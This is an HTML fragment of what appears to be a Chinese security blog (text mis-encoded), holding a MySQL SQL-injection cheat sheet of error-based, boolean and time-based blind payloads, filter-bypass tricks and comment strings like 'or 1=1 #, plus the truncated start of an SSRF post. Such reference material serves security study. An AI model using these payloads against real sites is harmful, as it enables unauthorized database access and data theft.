¼å¼ä¸æ­£ç¡®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT UUID_TO_BIN((SELECT password FROM users WHERE id&#x3D;1));</span><br><span class="line">SELECT BIN_TO_UUID((SELECT password FROM users WHERE id&#x3D;1));</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªğŸ‘´è¿˜æ²¡æµ‹</p><h4 id="GTID-ç›¸å…³å‡½æ•°"><a href="#GTID-ç›¸å…³å‡½æ•°" class="headerlink" title="GTID ç›¸å…³å‡½æ•°"></a>GTID ç›¸å…³å‡½æ•°</h4><p>åŒæ ·ä¹Ÿæ˜¯å‚æ•°æ ¼å¼ä¸æ­£ç¡®ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select gtid_subset(user(),1);</span><br><span class="line">select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);</span><br><span class="line">select gtid_subtract((select * from(select user())a),1);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/AxWCeFVRBES7plz.png"></p><h4 id="join-using-æ³¨åˆ—å"><a href="#join-using-æ³¨åˆ—å" class="headerlink" title="join using æ³¨åˆ—å"></a>join using æ³¨åˆ—å</h4><p>é€šè¿‡ç³»ç»Ÿå…³é”®è¯ join å¯å»ºç«‹ä¸¤ä¸ªè¡¨ä¹‹é—´çš„å†…è¿æ¥ï¼Œé€šè¿‡å¯¹æƒ³è¦æŸ¥è¯¢åˆ—åçš„è¡¨ä¸å…¶è‡ªèº«å»ºç«‹å†…è¿æ¥ï¼Œä¼šç”±äºå†—ä½™çš„åŸå› ï¼ˆç›¸åŒåˆ—åå­˜åœ¨ï¼‰è€Œå‘ç”Ÿé”™è¯¯ï¼Œå¹¶ä¸”æŠ¥é”™ä¿¡æ¯ä¼šå­˜åœ¨é‡å¤çš„åˆ—åï¼Œå¯ä»¥ä½¿ç”¨ USING è¡¨è¾¾å¼å£°æ˜å†…è¿æ¥ï¼ˆINNER JOINï¼‰æ¡ä»¶æ¥é¿å…æŠ¥é”™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from users a join (select * from users)b)c;</span><br><span class="line">select * from(select * from users a join (select * from users)b using(username))c;</span><br><span class="line">select * from(select * from users a join (select * from users)b using(username,password))c</span><br></pre></td></tr></table></figure><p>ğŸ‘´ä¸å’‹æ‡‚ï¼Œå¸Œæœ›å“ªä½SQLğŸ‘´å¯ä»¥å¸¦å¸¦ğŸ‘´</p><h4 id="ST-ç›¸å…³å‡½æ•°"><a href="#ST-ç›¸å…³å‡½æ•°" class="headerlink" title="ST ç›¸å…³å‡½æ•°"></a>ST ç›¸å…³å‡½æ•°</h4><p>MySQL 5.7</p><ul><li><code>select ST_LatFromGeoHash(version());</code></li><li><code>select ST_LongFromGeoHash(version());</code></li><li><code>select ST_PointFromGeoHash(version(),1);</code></li></ul><p><img src="https://i.loli.net/2021/04/26/hmOj8uBfU2PEiRq.png"></p><hr><h4 id="æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨"><a href="#æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨" class="headerlink" title="æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨"></a>æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨</h4><p>æ³¨ï¼šé»˜è®¤MYSQL_ERRMSG_SIZE=512</p><table><thead><tr><th>ç±»åˆ«</th><th>å‡½æ•°</th><th>ç‰ˆæœ¬éœ€æ±‚</th><th>5.5.x</th><th>5.6.x</th><th>5.7.x</th><th>8.x</th><th>å‡½æ•°æ˜¾é”™é•¿åº¦</th><th>MysqlæŠ¥é”™å†…å®¹é•¿åº¦</th><th>é¢å¤–é™åˆ¶</th></tr></thead><tbody><tr><td>ä¸»é”®é‡å¤</td><td>floor round</td><td>â“</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td>64</td><td></td><td>data_type â‰  varchar</td></tr><tr><td>åˆ—åé‡å¤</td><td>name_const</td><td>â“</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td></td><td>only version()</td></tr><tr><td></td><td>join</td><td>[5.5.49, ?)</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td></td><td>only columns</td></tr><tr><td>æ•°æ®æº¢å‡º - Double</td><td>1e308 cot exp pow</td><td>[5.5.5, 5.5.48]</td><td>âœ”ï¸</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>æ•°æ®æº¢å‡º - BIGINT</td><td></td><td>[5.5.5, 5.5.48]</td><td>âœ”ï¸</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>å‡ ä½•å¯¹è±¡</td><td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td><td>[?, 5.5.48]</td><td>âœ”ï¸</td><td></td><td></td><td></td><td></td><td>244</td><td></td></tr><tr><td>ç©ºé—´å‡½æ•° Geohash</td><td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td><td>[5.7, ?)</td><td></td><td></td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>128</td><td></td><td></td></tr><tr><td>GTID</td><td>gtid_subset gtid_subtract</td><td>[5.6.5, ?)</td><td></td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>200</td><td></td><td></td></tr><tr><td>JSON</td><td>json_*</td><td>[5.7.8, 5.7.11]</td><td></td><td></td><td>âœ”ï¸</td><td></td><td>200</td><td></td><td></td></tr><tr><td>UUID</td><td>uuid_to_bin bin_to_uuid</td><td>[8.0, ?)</td><td></td><td></td><td></td><td>âœ”ï¸</td><td>128</td><td></td><td></td></tr><tr><td>XPath</td><td>extractvalue updatexml</td><td>[5.1.5, ?)</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>32</td><td></td><td></td></tr></tbody></table><p>æ‘˜è‡ªâ€”â€”<a href="https://blog.sari3l.com/posts/9622f295/">Mysql æ³¨å…¥åŸºç¡€å°ç»“</a></p><hr><h3 id="Blind-Based"><a href="#Blind-Based" class="headerlink" title="Blind Based"></a>Blind Based</h3><h4 id="Booleanï¼ˆ1-or-0ï¼‰"><a href="#Booleanï¼ˆ1-or-0ï¼‰" class="headerlink" title="Booleanï¼ˆ1 or 0ï¼‰"></a>Booleanï¼ˆ1 or 0ï¼‰</h4><ul><li><code>id=87 and length(user())&gt;0</code></li><li><code>id=87 and length(user())&gt;100</code></li><li><code>id=87 and ascii(mid(user(),1,1))&gt;100</code></li><li><code>id=87 or ((select user()) regexp binary &#39;^[a-z]&#39;)</code></li></ul><h4 id="Timeï¼ˆæ— å›æ˜¾ï¼‰"><a href="#Timeï¼ˆæ— å›æ˜¾ï¼‰" class="headerlink" title="Timeï¼ˆæ— å›æ˜¾ï¼‰"></a>Timeï¼ˆæ— å›æ˜¾ï¼‰</h4><ul><li><code>id=87 and if(length(user())&gt;0, sleep(10), 1)=1</code></li><li><code>id=87 and if(length(user())&gt;100, sleep(10), 1)=1</code></li><li><code>id=87 and if(ascii(mid(user(),1,1))&gt;100, sleep(10), 1)=1</code></li></ul><h3 id="Common-Bypass"><a href="#Common-Bypass" class="headerlink" title="Common Bypass"></a>Common Bypass</h3><h4 id="and-or"><a href="#and-or" class="headerlink" title="and / or"></a>and / or</h4><ol><li>åŒå†™ ananddã€oorr</li><li>ä½¿ç”¨è¿ç®—ç¬¦ä»£æ›¿ &amp;&amp;ã€||</li><li>ç›´æ¥æ‹¼æ¥ = å·ï¼Œsuch as <code>?id=1=(condition)</code></li><li>å…¶ä»–æ–¹æ³•ï¼Œsuch as <code>?id=1^(condition)</code></li><li>å¤§å°å†™</li><li>urlencode</li></ol><h4 id="ç©ºæ ¼"><a href="#ç©ºæ ¼" class="headerlink" title="ç©ºæ ¼"></a>ç©ºæ ¼</h4><ol><li>å¤šå±‚ç©ºæ ¼åµŒå¥—</li><li>æ”¹ç”¨ +</li><li>ä½¿ç”¨æ³¨é‡Š /**/</li><li>and / or åé¢å¯ä»¥è·Ÿä¸Šå¶æ•°ä¸ª !ã€~ å¯ä»¥æ›¿ä»£ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥æ··åˆä½¿ç”¨ï¼ˆè§„å¾‹åˆä¸åŒï¼‰</li><li><code>%09, %0a, %0b, %0c, %0d, %a0</code> ç­‰éƒ¨åˆ†ä¸å¯è§å­—ç¬¦å¯ä¹Ÿä»£æ›¿ç©ºæ ¼</li></ol><p>such as <code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p><h4 id="æ‹¬å·"><a href="#æ‹¬å·" class="headerlink" title="æ‹¬å·"></a>æ‹¬å·</h4><ul><li>order by å¤§å°æ¯”è¾ƒç›²æ³¨</li></ul><p>ä¸æ‡‚QAQï¼Œæ±‚æ•™</p><h4 id="é€—å·"><a href="#é€—å·" class="headerlink" title="é€—å·"></a>é€—å·</h4><ol><li>æ”¹ç”¨ç›²æ³¨</li><li><code>UNION SELECT 1,2,3</code> =&gt; <code>UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)</code></li><li><code>mid(user(), 1, 1)</code> =&gt; <code>mid(user() from 1 for 1)</code></li><li><code>LIMIT N, M</code> =&gt; <code>LIMIT M OFFSET N</code></li></ol><h4 id="å…¶ä»–ç³»ç»Ÿå…³é”®å­—"><a href="#å…¶ä»–ç³»ç»Ÿå…³é”®å­—" class="headerlink" title="å…¶ä»–ç³»ç»Ÿå…³é”®å­—"></a>å…¶ä»–ç³»ç»Ÿå…³é”®å­—</h4><ol><li>åŒå†™ç»•è¿‡å…³é”®å­—è¿‡æ»¤</li><li>ä½¿ç”¨åŒä¹‰å‡½æ•° / è¯­å¥ä»£æ›¿ï¼Œå¦‚ if å‡½æ•°å¯ç”¨<code>case when condition then 1 else 0 end</code>è¯­å¥ä»£æ›¿</li><li>å¤§å°å†™</li><li>urlencode</li></ol><h4 id="å•åŒå¼•å·è¢«è¿‡æ»¤-æ‹¦æˆª-è½¬ä¹‰"><a href="#å•åŒå¼•å·è¢«è¿‡æ»¤-æ‹¦æˆª-è½¬ä¹‰" class="headerlink" title="å•åŒå¼•å·è¢«è¿‡æ»¤ / æ‹¦æˆª / è½¬ä¹‰"></a>å•åŒå¼•å·è¢«è¿‡æ»¤ / æ‹¦æˆª / è½¬ä¹‰</h4><ol><li>éœ€è¦è·³å‡ºå•å¼•å·çš„æƒ…å†µï¼šå°è¯•æ˜¯å¦å­˜åœ¨ç¼–ç é—®é¢˜è€Œäº§ç”Ÿçš„SQLæ³¨å…¥</li><li>ä¸éœ€è¦è·³å‡ºå•å¼•å·çš„æƒ…å†µï¼šå­—ç¬¦ä¸²å¯ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œä¹Ÿå¯é€šè¿‡è¿›åˆ¶è½¬æ¢å‡½æ•°è¡¨ç¤ºæˆå…¶ä»–è¿›åˆ¶ï¼Œæ± base_con</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">åè¿›åˆ¶è½¬æ¢æˆäºŒè¿›åˆ¶</span><br><span class="line">select bin(5);</span><br><span class="line">åè¿›åˆ¶è½¬æ¢æˆå…«è¿›åˆ¶</span><br><span class="line">select oct(5);</span><br><span class="line">åè¿›åˆ¶è½¬æ¢æˆåå…­è¿›åˆ¶</span><br><span class="line">select hex(5);</span><br><span class="line">äºŒè¿›åˆ¶è½¬æ¢æˆåè¿›åˆ¶</span><br><span class="line">select conv(&#39;101&#39;,2,10);</span><br><span class="line">åè¿›åˆ¶è½¬æ¢æˆåå…­è¿›åˆ¶</span><br><span class="line">select conv(&#39;20&#39;,10,16);</span><br><span class="line">è¿˜åŸåå…­è¿›åˆ¶</span><br><span class="line">unhex(conv(DEC_DATA,10,16))</span><br></pre></td></tr></table></figure><h4 id="æ•°å­—"><a href="#æ•°å­—" class="headerlink" title="æ•°å­—"></a>æ•°å­—</h4><table><thead><tr><th>ä»£æ›¿å­—ç¬¦</th><th>æ•°</th><th>ä»£æ›¿å­—ç¬¦</th><th>æ•°</th><th>å­—</th><th>ä»£æ›¿å­—ç¬¦</th><th>æ•°</th><th>å­—</th></tr></thead><tbody><tr><td>falseã€!pi()</td><td>0</td><td>ceil(pi()*pi())</td><td>10</td><td>A</td><td>ceil((pi()+pi())*pi())</td><td>20</td><td>K</td></tr><tr><td>trueã€!(!pi())</td><td>1</td><td>ceil(pi()*pi())+true</td><td>11</td><td>B</td><td>ceil(ceil(pi())*version())</td><td>21</td><td>L</td></tr><tr><td>true+true</td><td>2</td><td>ceil(pi()+pi()+version())</td><td>12</td><td>C</td><td>ceil(pi()*ceil(pi()+pi()))</td><td>22</td><td>M</td></tr><tr><td>floor(pi())ã€~~pi()</td><td>3</td><td>floor(pi()*pi()+pi())</td><td>13</td><td>D</td><td>ceil((pi()+ceil(pi()))*pi())</td><td>23</td><td>N</td></tr><tr><td>ceil(pi())</td><td>4</td><td>ceil(pi()*pi()+pi())</td><td>14</td><td>E</td><td>ceil(pi())*ceil(version())</td><td>24</td><td>O</td></tr><tr><td>floor(version()) //æ³¨æ„ç‰ˆæœ¬</td><td>5</td><td>ceil(pi()*pi()+version())</td><td>15</td><td>F</td><td>floor(pi()*(version()+pi()))</td><td>25</td><td>P</td></tr><tr><td>ceil(version())</td><td>6</td><td>floor(pi()*version())</td><td>16</td><td>G</td><td>floor(version()*version())</td><td>26</td><td>Q</td></tr><tr><td>ceil(pi()+pi())</td><td>7</td><td>ceil(pi()*version())</td><td>17</td><td>H</td><td>ceil(version()*version())</td><td>27</td><td>R</td></tr><tr><td>floor(version()+pi())</td><td>8</td><td>ceil(pi()*version())+true</td><td>18</td><td>I</td><td>ceil(pi()*pi()*pi()-pi())</td><td>28</td><td>S</td></tr><tr><td>floor(pi()*pi())</td><td>9</td><td>floor((pi()+pi())*pi())</td><td>19</td><td>J</td><td>floor(pi()*pi()*floor(pi()))</td><td>29</td><td>T</td></tr></tbody></table><hr><h3 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h3><h4 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">&#x2F;*(MySQL-5.1)</span><br><span class="line">&#x2F;**&#x2F;(ä¸€ä¸ª *&#x2F; å¯ä»¥é—­åˆå‰é¢å¤šä¸ª&#x2F;*)</span><br><span class="line">;%00(PDOæ”¯æ´å¤šèªå¥)</span><br><span class="line">&#96;(MySQL &lt;&#x3D; 5.5)</span><br><span class="line">&#39;or 1&#x3D;1;%00</span><br><span class="line">&#39;or 1&#x3D;1 union select 1,2&#96;&#39;</span><br><span class="line">&#39;or 1&#x3D;1 #</span><br><span class="line">&#39;&#x2F;*!50000or*&#x2F; 1&#x3D;1 -- -      &#x2F;&#x2F;ç‰ˆæœ¬å·ä¸º5.1.38æ—¶åªè¦å°äº50138</span><br><span class="line">&#39;&#x2F;*!or*&#x2F; 1&#x3D;1 -- -</span><br></pre></td></tr></table></figure><h4 id="å¸¸ç”¨"><a href="#å¸¸ç”¨" class="headerlink" title="å¸¸ç”¨"></a>å¸¸ç”¨</h4><h5 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h5><table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>ä¸ï¼ŒåŒand</td><td>||</td><td>æˆ–ï¼ŒåŒor</td></tr><tr><td>!</td><td>éï¼ŒåŒnot</td><td>~</td><td>ä¸€å…ƒæ¯”ç‰¹åè½¬</td></tr><tr><td>^</td><td>å¼‚æˆ–ï¼ŒåŒxor</td><td>+</td><td>åŠ ï¼Œå¯æ›¿ä»£ç©ºæ ¼ï¼Œå¦‚ <code>select+user()</code></td></tr></tbody></table><h5 id="ç³»ç»Ÿä¿¡æ¯å‡½æ•°"><a href="#ç³»ç»Ÿä¿¡æ¯å‡½æ•°" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯å‡½æ•°"></a>ç³»ç»Ÿä¿¡æ¯å‡½æ•°</h5><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>USER()</td><td>è·å–å½“å‰æ“ä½œå¥æŸ„çš„ç”¨æˆ·åï¼ŒåŒ SESSION_USER()ã€CURRENT_USER()ï¼Œæœ‰æ—¶ä¹Ÿç”¨ SYSTEM_USER()</td></tr><tr><td>DATABASE()</td><td>è·å–å½“å‰é€‰æ‹©çš„æ•°æ®åº“åï¼ŒåŒ SCHEMA()</td></tr><tr><td>VERSION()</td><td>è·å–å½“å‰ç‰ˆæœ¬ä¿¡æ¯</td></tr></tbody></table><h5 id="è¿›åˆ¶è½¬æ¢"><a href="#è¿›åˆ¶è½¬æ¢" class="headerlink" title="è¿›åˆ¶è½¬æ¢"></a>è¿›åˆ¶è½¬æ¢</h5><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ORD(str)</td><td>è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIå€¼</td></tr><tr><td>OCT(N)</td><td>ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å› <code>N</code> çš„å…«è¿›åˆ¶æ•°ï¼Œ<code>N</code> æ˜¯ä¸€ä¸ªBIGINT å‹æ•°å€¼ï¼Œä½œç”¨ç›¸å½“äº<code>CONV(N,10,8)</code></td></tr><tr><td>HEX(N_S)</td><td>å‚æ•°ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œè¿”å› <code>N_or_S</code> çš„16è¿›åˆ¶å­—ç¬¦ä¸²å½¢å¼ï¼Œä¸ºæ•°å­—æ—¶ï¼Œè¿”å›å…¶16è¿›åˆ¶æ•°å½¢å¼</td></tr><tr><td>UNHEX(str)</td><td><code>HEX(str)</code> çš„é€†å‘å‡½æ•°ã€‚å°†å‚æ•°ä¸­çš„æ¯ä¸€å¯¹16è¿›åˆ¶æ•°å­—éƒ½è½¬æ¢ä¸º10è¿›åˆ¶æ•°å­—ï¼Œç„¶åå†è½¬æ¢æˆ ASCII ç æ‰€å¯¹åº”çš„å­—ç¬¦</td></tr><tr><td>BIN(N)</td><td>è¿”å›åè¿›åˆ¶æ•°å€¼ <code>N</code> çš„äºŒè¿›åˆ¶æ•°å€¼çš„å­—ç¬¦ä¸²è¡¨ç°å½¢å¼</td></tr><tr><td>ASCII(str)</td><td>åŒ<code>ORD(string)</code></td></tr><tr><td>CONV(N,from_base,to_base)</td><td>å°†æ•°å€¼å‹å‚æ•° <code>N</code> ç”±åˆå§‹è¿›åˆ¶ <code>from_base</code> è½¬æ¢ä¸ºç›®æ ‡è¿›åˆ¶ <code>to_base</code> çš„å½¢å¼å¹¶è¿”å›</td></tr><tr><td>CHAR(N,â€¦ [USING charset_name])</td><td>å°†æ¯ä¸€ä¸ªå‚æ•° <code>N</code> éƒ½è§£é‡Šä¸ºæ•´æ•°ï¼Œè¿”å›ç”±è¿™äº›æ•´æ•°åœ¨ ASCII ç ä¸­æ‰€å¯¹åº”å­—ç¬¦æ‰€ç»„æˆçš„å­—ç¬¦ä¸²</td></tr></tbody></table><h5 id="å­—ç¬¦æˆªå–-æ‹¼æ¥"><a href="#å­—ç¬¦æˆªå–-æ‹¼æ¥" class="headerlink" title="å­—ç¬¦æˆªå–/æ‹¼æ¥"></a>å­—ç¬¦æˆªå–/æ‹¼æ¥</h5><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>SUBSTR(str,N_start,N_length)</td><td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²è¿›è¡Œæˆªå–ï¼Œä¸ºSUBSTRINGçš„ç®€å•ç‰ˆ</td></tr><tr><td>SUBSTRING()</td><td>å¤šç§æ ¼å¼<code>SUBSTRING(str,pos)ã€SUBSTRING(str FROM pos)ã€SUBSTRING(str,pos,len)ã€SUBSTRING(str FROM pos FOR len)</code></td></tr><tr><td>RIGHT(str,len)</td><td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²ä»æœ€å³è¾¹æˆªå–æŒ‡å®šé•¿åº¦</td></tr><tr><td>LEFT(str,len)</td><td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²ä»æœ€å·¦è¾¹æˆªå–æŒ‡å®šé•¿åº¦</td></tr><tr><td>RPAD(str,len,padstr)</td><td>åœ¨ <code>str</code> å³æ–¹è¡¥é½ <code>len</code> ä½çš„å­—ç¬¦ä¸² <code>padstr</code>ï¼Œè¿”å›æ–°å­—ç¬¦ä¸²ã€‚å¦‚æœ <code>str</code> é•¿åº¦å¤§äº <code>len</code>ï¼Œåˆ™è¿”å›å€¼çš„é•¿åº¦å°†ç¼©å‡åˆ° <code>len</code> æ‰€æŒ‡å®šçš„é•¿åº¦</td></tr><tr><td>LPAD(str,len,padstr)</td><td>ä¸RPADç›¸ä¼¼ï¼Œåœ¨<code>str</code>å·¦è¾¹è¡¥é½</td></tr><tr><td>MID(str,pos,len)</td><td>åŒäº <code>SUBSTRING(str,pos,len)</code></td></tr><tr><td>INSERT(str,pos,len,newstr)</td><td>åœ¨åŸå§‹å­—ç¬¦ä¸² <code>str</code> ä¸­ï¼Œå°†è‡ªå·¦æ•°ç¬¬ <code>pos</code> ä½å¼€å§‹ï¼Œé•¿åº¦ä¸º <code>len</code> ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºæ–°å­—ç¬¦ä¸² <code>newstr</code>ï¼Œç„¶åè¿”å›ç»è¿‡æ›¿æ¢åçš„å­—ç¬¦ä¸²ã€‚<code>INSERT(str,len,1,0x0)</code>å¯å½“åšæˆªå–å‡½æ•°</td></tr><tr><td>CONCAT(str1,str2â€¦)</td><td>å‡½æ•°ç”¨äºå°†å¤šä¸ªå­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</td></tr><tr><td>GROUP_CONCAT(â€¦)</td><td>è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœï¼Œè¯¥ç»“æœç”±åˆ†ç»„ä¸­çš„å€¼è¿æ¥ç»„åˆè€Œæˆ</td></tr><tr><td>MAKE_SET(bits,str1,str2,â€¦)</td><td>æ ¹æ®å‚æ•°1ï¼Œè¿”å›æ‰€è¾“å…¥å…¶ä»–çš„å‚æ•°å€¼ã€‚å¯ç”¨ä½œå¸ƒå°”ç›²æ³¨ï¼Œå¦‚ï¼š<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code></td></tr></tbody></table><h5 id="å¸¸è§å…¨å±€å˜é‡"><a href="#å¸¸è§å…¨å±€å˜é‡" class="headerlink" title="å¸¸è§å…¨å±€å˜é‡"></a>å¸¸è§å…¨å±€å˜é‡</h5><table><thead><tr><th>å˜é‡</th><th>è¯´æ˜</th><th>å˜é‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>@@VERSION</td><td>è¿”å›ç‰ˆæœ¬ä¿¡æ¯</td><td>@@HOSTNAME</td><td>è¿”å›å®‰è£…çš„è®¡ç®—æœºåç§°</td></tr><tr><td>@@GLOBAL.VERSION</td><td>åŒ<code>@@VERSION</code></td><td>@@BASEDIR</td><td>è¿”å›MYSQLç»å¯¹è·¯å¾„</td></tr></tbody></table><p>å¯ä»¥ç”¨ <code>SHOW GLOBAL VARIABLES;</code> æŸ¥çœ‹å…¨éƒ¨å…¨å±€å˜é‡</p><h5 id="å…¶ä»–å¸¸ç”¨å‡½æ•°-è¯­å¥"><a href="#å…¶ä»–å¸¸ç”¨å‡½æ•°-è¯­å¥" class="headerlink" title="å…¶ä»–å¸¸ç”¨å‡½æ•° / è¯­å¥"></a>å…¶ä»–å¸¸ç”¨å‡½æ•° / è¯­å¥</h5><table><thead><tr><th>å‡½æ•°/è¯­å¥</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>LENGTH(str)</td><td>è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦</td></tr><tr><td>PI()</td><td>è¿”å›Ï€çš„å…·ä½“æ•°å€¼</td></tr><tr><td>REGEXP â€œstatementâ€</td><td>æ­£åˆ™åŒ¹é…æ•°æ®ï¼Œè¿”å›å€¼ä¸ºå¸ƒå°”å€¼</td></tr><tr><td>LIKE â€œstatementâ€</td><td>åŒ¹é…æ•°æ®ï¼Œ%ä»£è¡¨ä»»æ„å†…å®¹ã€‚è¿”å›å€¼ä¸ºå¸ƒå°”å€¼</td></tr><tr><td>RLIKE â€œstatementâ€</td><td>ä¸regexpç›¸åŒ</td></tr><tr><td>LOCATE(substr,str,[pos])</td><td>è¿”å›å­å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</td></tr><tr><td>POSITION(substr IN str)</td><td>ç­‰åŒäº <code>LOCATE()</code></td></tr><tr><td>LOWER(str)</td><td>å°†å­—ç¬¦ä¸²çš„å¤§å†™å­—æ¯å…¨éƒ¨è½¬æˆå°å†™ã€‚åŒï¼š<code>LCASE(str)</code></td></tr><tr><td>UPPER(str)</td><td>å°†å­—ç¬¦ä¸²çš„å°å†™å­—æ¯å…¨éƒ¨è½¬æˆå¤§å†™ã€‚åŒï¼š<code>UCASE(str)</code></td></tr><tr><td>ELT(N,str1,str2,str3,â€¦)</td><td>ä¸<code>MAKE_SET(bit,str1,str2...)</code>ç±»ä¼¼ï¼Œæ ¹æ®<code>N</code>è¿”å›å‚æ•°å€¼</td></tr><tr><td>NULLIF(expr1,expr2)</td><td>è‹¥expr1ä¸expr2ç›¸åŒï¼Œåˆ™è¿”å›expr1ï¼Œå¦åˆ™è¿”å›NULL</td></tr><tr><td>CHARSET(str)</td><td>è¿”å›å­—ç¬¦ä¸²ä½¿ç”¨çš„å­—ç¬¦é›†</td></tr><tr><td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td><td>ä½¿ç”¨ pass_str ä½œä¸ºå¯†ç ï¼Œè§£å¯†åŠ å¯†å­—ç¬¦ä¸² crypt_strã€‚åŠ å¯†å‡½æ•°ï¼š<code>ENCODE(str,pass_str)</code></td></tr></tbody></table><hr>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRFçš„ä¸€äº›tricks</title>
      <link href="2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/"/>
      <url>2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/</url>
      
        <content type="html"><![CDATA[<p>SSRF æ˜¯ä»€ä¹ˆï¼Ÿç®€å•åœ°æ¥è¯´ï¼šåˆ©ç”¨ä¸€ä¸ªå¯ä»¥å‘èµ·ç½‘ç»œè¯·æ±‚çš„æœåŠ¡å½“ä½œè·³æ¿æ¥æ”»å‡»å†…éƒ¨å…¶ä»–æœåŠ¡</p><p>å¯ä»¥ç”¨æ¥ï¼š</p><ul><li>æ¢æµ‹å†…ç½‘ä¿¡æ¯</li><li>æ”»å‡»å†…ç½‘æˆ–æœ¬åœ°å…¶ä»–æœåŠ¡</li><li>ç©¿é€é˜²ç«å¢™</li></ul><p>å¯»æ‰¾æ–¹æ³•ï¼š</p><ul><li>èƒ½å¤Ÿå¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚çš„åœ°æ–¹</li><li>è¯·æ±‚è¿œç¨‹æœåŠ¡å™¨èµ„æºçš„åœ°æ–¹</li><li>æ•°æ®åº“å†…ç½®åŠŸèƒ½</li><li>é‚®ä»¶ç³»ç»Ÿ</li><li>æ–‡ä»¶å¤„ç†</li><li>åœ¨çº¿å¤„ç†å·¥å…·</li></ul><h2 id="ä¸€äº›ç»•è¿‡çš„æ–¹æ³•"><a href="#ä¸€äº›ç»•è¿‡çš„æ–¹æ³•" class="headerlink" title="ä¸€äº›ç»•è¿‡çš„æ–¹æ³•"></a>ä¸€äº›ç»•è¿‡çš„æ–¹æ³•</h2><h3 id="0x00-æ”»å‡»æœ¬åœ°"><a href="#0x00-æ”»å‡»æœ¬åœ°" class="headerlink" title="0x00 æ”»å‡»æœ¬åœ°"></a>0x00 æ”»å‡»æœ¬åœ°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 